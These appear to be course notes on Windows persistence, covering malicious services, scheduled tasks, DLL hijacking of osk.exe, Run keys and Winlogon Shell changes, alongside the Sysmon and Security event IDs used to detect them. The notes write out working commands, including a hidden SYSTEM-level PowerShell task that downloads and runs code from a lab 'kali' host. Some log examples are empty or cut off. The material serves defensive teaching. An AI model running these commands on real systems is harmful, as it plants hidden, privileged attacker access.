# 7. Windows Persistence

## Main Idea

Persistence means an attacker keeps access to a compromised Windows machine even after:

- the original vulnerability is patched
- the machine is rebooted
- the user logs off
- the first shell dies

Persistence allows the attacker to regain access without exploiting the original weakness again.

In this chapter, persistence is split into two main areas:

```text
1. Persistence on Disk
2. Persistence in Registry
```

The main techniques are:

```text
Technique 1: Windows Service Persistence
Technique 2: Scheduled Task Persistence
Technique 3: DLL Sideloading / DLL Hijacking
Technique 4: Registry Run Key Persistence
Technique 5: Winlogon Helper Persistence
```

Important defender idea:

```text
Persistence is not only about the malicious payload.
It is also about the mechanism that automatically starts the payload again.
```

---

# 7.1 Persistence on Disk

## What Is Disk-Based Persistence?

Disk-based persistence means the attacker places a file on disk and creates a Windows mechanism that automatically executes it.

Examples of attacker files:

```text
.exe payload
.dll payload
.ps1 script
.bat file
scheduled task file
service binary
```

Common Windows mechanisms used:

```text
Windows Services
Scheduled Tasks
DLL loading behavior
```

Important artifacts:

```text
Sysmon Event ID 1  = ProcessCreate
Sysmon Event ID 3  = NetworkConnect
Sysmon Event ID 11 = FileCreate
Sysmon Event ID 13 = Registry value set
Sysmon Event ID 22 = DNS query

Security Event ID 4697 = Service installed
Security Event ID 4698 = Scheduled task created
```

---

# Technique 1: Persisting via Windows Service

## What Is a Windows Service?

A Windows service is a background process that can run without direct user interaction.

Examples of normal services:

```text
Windows Update
Print Spooler
Defender services
VMware tools services
Database services
Web server services
```

Attackers like services because services can:

```text
Start automatically at boot
Run without user interaction
Run before a user logs in
Run as LocalSystem / SYSTEM
Survive reboots
Look like normal Windows administration
```

A malicious service can give the attacker access every time the machine starts.

---

## Example Lab Service

The attacker creates a fake service called:

```text
VindowsUpdate
```

This is suspicious because it looks similar to:

```text
WindowsUpdate
```

but it is misspelled.

Example command:

```cmd
sc.exe create VindowsUpdate start= auto error= ignore binpath= C:\tools\windows_persistence\prst_servshell443.exe
```

---

## Command Breakdown

```text
sc.exe
```

Windows Service Control tool.

```text
create VindowsUpdate
```

Creates a new service named `VindowsUpdate`.

```text
start= auto
```

The service starts automatically when Windows boots.

```text
error= ignore
```

If the service fails, Windows logs the error but does not interrupt startup.

```text
binpath= C:\tools\windows_persistence\prst_servshell443.exe
```

This is the executable that the service runs. In this case, the executable is the attacker payload.

---

## Important `sc.exe` Syntax Detail

With `sc.exe`, there must be a space after the equals sign.

Correct:

```cmd
sc.exe create VindowsUpdate start= auto error= ignore binpath= C:\tools\windows_persistence\prst_servshell443.exe
```

Wrong or may fail:

```cmd
sc.exe create VindowsUpdate start=auto error=ignore binpath=C:\tools\windows_persistence\prst_servshell443.exe
```

---

## Result of Service Persistence

After reboot, the service starts automatically and the attacker receives a shell.

Expected Meterpreter result:

```text
getuid
Server username: NT AUTHORITY\SYSTEM
```

Meaning:

```text
The service-based persistence runs as SYSTEM.
```

This is dangerous because SYSTEM is the highest local privilege level on Windows.

---


For the malicious service:

```text

```


In the lab, the service payload starts:

```text

```

Example:

```text
Image: C:\Windows\System32\rundll32.exe
ParentImage: C:\tools\windows_persistence\prst_servshell443.exe

```


This proves that the service payload caused outbound attacker communication.

# Technique 2: Persisting via Scheduled Tasks

## What Is a Scheduled Task?

Windows Task Scheduler runs programs or commands based on triggers.

Examples of triggers:

```text
At logon
At startup
Every minute
Daily
Weekly
At a specific time
When a Windows event occurs
```

Scheduled tasks are stored on disk under:

```text
C:\Windows\System32\Tasks
```

They are stored as task configuration files using XML-like structure.

---

## Why Scheduled Tasks Are Useful for Attackers

Attackers use scheduled tasks because they can:

```text
Run repeatedly
Run after reboot
Run as SYSTEM
Run hidden PowerShell commands
Run at logon or startup
Blend in with normal admin activity
```

---

## Query Existing Scheduled Task

Example:

```cmd
schtasks /query /tn MicrosoftEdgeUpdateTaskMachineCore
```

This shows:

```text
TaskName
Next Run Time
Status
Folder
```

---

## Important Scheduled Task XML Sections

## 1. Triggers

Triggers define when the task runs.

Example:

```xml
<Triggers>
  <LogonTrigger>
    <Enabled>true</Enabled>
  </LogonTrigger>
  <CalendarTrigger>
    <ScheduleByDay>
      <DaysInterval>1</DaysInterval>
    </ScheduleByDay>
  </CalendarTrigger>
</Triggers>
```

Meaning:

```text
Run when user logs in
Run every day
```

---

## 2. Principals

Principals define the user/security context.

Example:

```xml
<Principals>
  <Principal>
    <UserId>S-1-5-18</UserId>
    <RunLevel>HighestAvailable</RunLevel>
  </Principal>
</Principals>
```

Important SID:

```text
S-1-5-18 = LocalSystem / NT AUTHORITY\SYSTEM
```

Meaning:

```text
The task runs as SYSTEM with highest available privileges.
```

---

## 3. Settings

Settings control task behavior.

Example:

```xml
<Enabled>true</Enabled>
<StartWhenAvailable>true</StartWhenAvailable>
<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
```

Meaning:

```text
Task is enabled
Task can start when available
Task can run up to 72 hours
```

---

## 4. Actions

Actions define what the task actually executes.

Example:

```xml
<Actions>
  <Exec>
    <Command>powershell.exe</Command>
    <Arguments>-nop -w hidden -c ...</Arguments>
  </Exec>
</Actions>
```

This is the most important part for defenders.

---

## Example Malicious Scheduled Task

```cmd
schtasks /create /tn WindowzUpdate /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://kali:8000/eviltask'''))'" /sc minute /ru System /rl HIGHEST
```

---

## Command Breakdown

```text
/create
```

Create a new scheduled task.

```text
/tn WindowzUpdate
```

Task name is `WindowzUpdate`.

This is suspicious because it looks like `WindowsUpdate` but is misspelled.

```text
/tr "..."
```

Task action. This is the command that runs.

```text
/sc minute
```

Run every minute.

```text
/ru System
```

Run as SYSTEM.

```text
/rl HIGHEST
```

Run with highest privileges.

---

## Result of Scheduled Task Persistence

After reboot, the task runs automatically and downloads/executes the payload.

Expected Meterpreter result:

```text

Server username: NT AUTHORITY\SYSTEM
```

Meaning:

```text
The scheduled task runs as SYSTEM.
```

# Technique 3: Persisting by DLL Sideloading / DLL Hijacking

## What Is a DLL?

DLL means:

```text
Dynamic-Link Library
```

A DLL contains reusable code that Windows programs load at runtime.

Examples:

```text
hid.dll
kernel32.dll
user32.dll
ntdll.dll
```

Programs use DLLs so they do not need to include all code inside the `.exe` file.

---

## Why DLL Loading Can Be Abused

When a program needs a DLL, Windows searches for it in a specific order.

If an attacker places a malicious DLL in a location that Windows checks before the legitimate DLL location, the program may load the attacker’s DLL.

This is called:

```text
DLL Search Order Hijacking
```

or:

```text
DLL Sideloading
```

---

## DLL Sideloading vs DLL Hijacking

## DLL Sideloading

The attacker places the malicious DLL next to a legitimate application.

Example:

```text
Legitimate app: C:\Program Files\App\app.exe
Malicious DLL:  C:\Program Files\App\expected.dll
```

When `app.exe` runs, it loads the attacker’s DLL.

---

## DLL Hijacking

The attacker places the malicious DLL somewhere earlier in the DLL search path.

Example:

```text
Application expects HID.dll
Legitimate HID.dll is in C:\Windows\System32
Attacker places HID.dll somewhere Windows checks first
Application loads attacker HID.dll
```

---

## DLL Search Order Concept

Windows checks locations in order.

Important locations can include:

```text
Application directory
System directories
Windows directory
Current working directory
PATH directories
KnownDLLs registry list
```

KnownDLLs registry path:

```text
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
```

Safe DLL search mode registry path:

```text
HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode
```

By default, SafeDllSearchMode is enabled.

---

## Lab Example: On-Screen Keyboard DLL Hijack

Target application:

```text
osk.exe
```

Default path:

```text
C:\Windows\System32\osk.exe
```

Target DLL name:

```text
HID.dll
```

Attacker copies malicious DLL to:

```text
C:\Program Files\Common Files\microsoft shared\ink\HID.dll
```

Command:

```cmd
copy "C:\tools\windows_persistence\prst_dllshell443.dll" "C:\Program Files\Common Files\microsoft shared\ink\HID.dll"
```

Meaning:

```text
Take malicious DLL:
C:\tools\windows_persistence\prst_dllshell443.dll

Copy it to:
C:\Program Files\Common Files\microsoft shared\ink\

Rename it to:
HID.dll
```

When `osk.exe` starts, it loads `HID.dll`.

If Windows finds the attacker’s `HID.dll` first, the malicious DLL runs.

---

## Triggering the Persistence

Run:

```cmd
osk
```

or open On-Screen Keyboard from Accessibility settings.

If the malicious DLL loads, the attacker gets a callback.

Expected Meterpreter result:

```text
getuid
Server username: CLIENT01\offsec
```

Important:

```text
This runs as the user who started osk.exe.
It does not automatically give SYSTEM.
```

If `osk.exe` is started by a normal user, the shell runs as that user.

If a SYSTEM-level service or scheduled task starts a vulnerable program, the payload may run with higher privileges.

---

## Proxy DLL Concept

In the lab, On-Screen Keyboard may not open normally because the malicious DLL does not provide the real `HID.dll` functionality.

A more advanced attacker may use a proxy DLL.

Proxy DLL idea:

```text
Malicious DLL loads first
Malicious code executes
Then it forwards normal DLL functions to the real DLL
Application continues working normally
```

This makes the attack stealthier.

---

## Sysmon Artifact: DLL File Creation

### Sysmon Event ID 11: FileCreate

Example:

```text

Image: C:\Windows\system32\cmd.exe

```

Important:

```text

```

---


Important:

```text

```

---

## Sysmon Artifact: NetworkConnect

### Sysmon Event ID 3

Search for `rundll32.exe` network activity:


# 7.2 Persistence in Registry

## What Is Registry-Based Persistence?

The Windows Registry controls many startup and logon behaviors.

Attackers can modify registry keys so their payload runs automatically:

```text
When a user logs in
When the system starts
When Winlogon initializes the user session
```

Registry persistence may not require creating a new service or scheduled task.

Common registry persistence locations:

```text
Run keys
RunOnce keys
Winlogon Shell
Winlogon UserInit
Winlogon Notify
```

Important Sysmon event:

```text
Sysmon Event ID 13 = Registry value set
```

---

# Technique 4: Registry Run Key Persistence

## What Are Run Keys?

Run keys automatically execute programs when a user logs in.

Common locations:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

---

## HKCU vs HKLM

## HKCU

```text
HKEY_CURRENT_USER
```

Applies only to the currently logged-in user.

Example:

```text
If Administrator adds a Run key under HKCU,
it runs only when Administrator logs in.
```

---

## HKLM

```text
HKEY_LOCAL_MACHINE
```

Applies system-wide.

Example:

```text
If a Run key is added under HKLM,
it runs when any user logs in.
```

---

## Run vs RunOnce vs RunOnceEx

## Run

```text
Runs every time the user logs in.
Good for persistence.
```

## RunOnce

```text
Runs once and is removed at execution.
Less useful for long-term persistence.
```

## RunOnceEx

```text
Runs once but is not removed until the program finishes.
```

---

## Query Existing Run Keys

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
```

```cmd
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
```

Example normal values:

```text
SecurityHealth
VMware Tools
Microsoft Edge auto launch
```

---

## Example Attack Command

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdote /t REG_SZ /d "C:\tools\windows_persistence\prst_runshell443.exe" /f
```

---

## Command Breakdown

```text
reg add
```

Add or modify a registry value.

```text
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

System-wide Run key.

```text
/v WindowsUpdote
```

Name of the new value.

This is suspicious because it looks like `WindowsUpdate` but is misspelled.

```text
/t REG_SZ
```

Value type is a normal string.

```text
/d "C:\tools\windows_persistence\prst_runshell443.exe"
```

Data value. This is the executable to run at logon.

```text
/f
```

Force overwrite if the value already exists.

---

## Result of Run Key Persistence

After reboot and user login, the payload runs.

If Administrator logs in:

```text
getuid
Server username: CLIENT01\Administrator
```

Important:

```text
Run key persistence runs as the user who logs in.
It does not automatically run as SYSTEM.
```

If the logging-in user is admin, the payload may run with high privileges.

---


This shows how the Run key was created.

---

# Technique 5: Winlogon Helper Persistence

## What Is Winlogon?

Winlogon is responsible for the Windows logon process.

It controls activity such as:

```text
User profile loading
Desktop initialization
Workstation lock/unlock
User logon/logoff behavior
```

Relevant registry path:

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Important values/subkeys:

```text
Shell
UserInit
Notify
```

---

## Important Winlogon Values

## Shell

Default value:

```text
explorer.exe
```

The Shell value defines the default user shell loaded when a user logs in.

If an attacker changes it to:

```text
explorer.exe, C:\tools\windows_persistence\prst_winlogshell443.exe
```

then both Explorer and the attacker payload can run at logon.

---

## UserInit

Default value:

```text
C:\Windows\system32\userinit.exe,
```

`userinit.exe` initializes the user environment and starts the shell.

Attackers may append a malicious executable while preserving the original value.

Example concept:

```text
C:\Windows\system32\userinit.exe, C:\tools\windows_persistence\prst_winlogshell443.exe
```

Important:

```text
The original userinit.exe value should be preserved.
If it is removed, normal logon behavior may break.
```

---

## Notify

`Notify` is an older Winlogon persistence method, mostly relevant to older Windows versions.

It can load DLL notification packages during Winlogon events.

---

## Example Attack: Modify Shell Value

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\tools\windows_persistence\prst_winlogshell443.exe" /f
```

---

## Command Breakdown

```text
/v Shell
```

Modify the Shell value.

```text
/t REG_SZ
```

Use a normal string.

```text

```

Run normal Explorer plus attacker payload.


Force overwrite.

# Final Chapter Summary

This chapter covered Windows persistence mechanisms.

Main techniques:

```text
1. Windows Service persistence
2. Scheduled Task persistence
3. DLL sideloading / DLL hijacking
4. Registry Run key persistence
5. Winlogon Helper persistence
```

Main idea:

```text
Persistence allows attackers to regain access after reboot, logout, or patching.
```

Best defender approach:

```text
Correlate registry changes, file creation, process creation, DNS queries, and network connections.
```

Most important artifacts:

```text
Security 4697 = new service
Security 4698 = new scheduled task
Sysmon 11 = file created
Sysmon 13 = registry value set
Sysmon 1 = process created
Sysmon 22 = DNS query
Sysmon 3 = network connection
```

Most important lesson:

```text
The persistence mechanism is often more important than the payload.

Even if the payload is deleted, logs may still show how the attacker maintained access.
```
